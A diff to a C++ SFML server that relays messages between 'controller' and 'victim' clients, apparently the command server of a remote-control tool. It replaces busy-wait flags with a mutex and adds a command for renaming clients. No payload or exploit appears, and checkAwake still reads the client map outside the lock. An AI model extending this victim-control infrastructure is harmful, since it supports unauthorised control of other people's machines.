@@ -17,9 +17,8 @@ void Server::receive()
 	if (!selector.wait())
 		return;
 
-	while (!canReceive) {}
-	isReceiving = true;
-
+	//mutex used for clients write access
+	mutex.lock();
 	//check if a client has received something
 	for (auto& c : clients) {
 		if (!selector.isReady(*c.second.socket))
@@ -30,7 +29,7 @@ void Server::receive()
 
 		//disconnect client
 		if (p.getDataSize() == 0) {
-			std::cout << "disconnected ";
+			std::cout << "disconnected - ";
 			disconnect(c.first);
 			break;
 		}
@@ -45,6 +44,7 @@ void Server::receive()
 		else if (c.second.role == '-') {
 			sf::Uint8 role;
 			p >> role;
+			p >> c.second.name;
 			p.clear();
 
 			if (role == 'c' || role == 'v') {
@@ -62,8 +62,6 @@ void Server::receive()
 				c.second.socket->send(p);
 			}
 		}
-
-		return;
 	}
 	//check if a client is ready to connect
 	if (selector.isReady(listener)) {
@@ -77,24 +75,26 @@ void Server::receive()
 			currentId--;
 		}
 	}
-
-	isReceiving = false;
+	mutex.unlock();
 }
 void Server::checkAwake()
 {
 	while (true) {
-		auto copy = clients;
-		for (auto& c : copy) {
-			if (Mlib::getTime() - c.second.lastMsg < 5'000)
-				continue;
-
-			while (isReceiving) {}
-			canReceive = false;
-			std::cout << "timed out ";
-			disconnect(c.first);
-			canReceive = true;
+		std::vector<sf::Uint16> idsToRemove;
+		for (const auto& c : clients) {
+			if (Mlib::getTime() - c.second.lastMsg > 5'000)
+				idsToRemove.push_back(c.first);
 		}
-		Mlib::sleep(10);
+
+		//disconnect afk clients (mutex used for clients write access)
+		mutex.lock();
+		for (auto id : idsToRemove) {
+			std::cout << "timed out - ";
+			disconnect(id);
+		}
+		mutex.unlock();
+
+		Mlib::sleep(200);
 	}
 }
 
@@ -165,8 +165,28 @@ void Server::processControllerMsg(sf::Uint8 id, sf::Packet p)
 		if (clients[oId].role == '-')
 			return;
 
-		std::cout << "killed ";
+		std::cout << "killed - ";
 		disconnect(oId);
+	}
+	//rename client
+	else if (cmd == 'w') {
+		sf::Uint16 oId;
+		std::string name;
+		p >> oId >> name;
+
+		//client doesnt exist
+		if (clients.find(oId) == clients.end())
+			return;
+		//client isnt initialized
+		if (clients[oId].role == '-')
+			return;
+
+		clients[oId].name = name;
+		p.clear();
+		p << sf::Uint8('w') << name;
+		clients[oId].socket->send(p);
+
+		updateControllersList();
 	}
 }
 void Server::processVictimMsg(sf::Uint8 id, sf::Packet p)
@@ -223,7 +243,7 @@ void Server::updateControllersList()
 			continue;
 
 		p.clear();
-		p << ((c.second.role == 'c') ? sf::Uint8('n') : sf::Uint8('l')) << c.first << c.second.time;
+		p << ((c.second.role == 'c') ? sf::Uint8('n') : sf::Uint8('l')) << c.first << c.second.name << c.second.time;
 		p << c.second.socket->getRemoteAddress().toInteger() << c.second.socket->getRemotePort();
 
 		if (c.second.pair != 0)
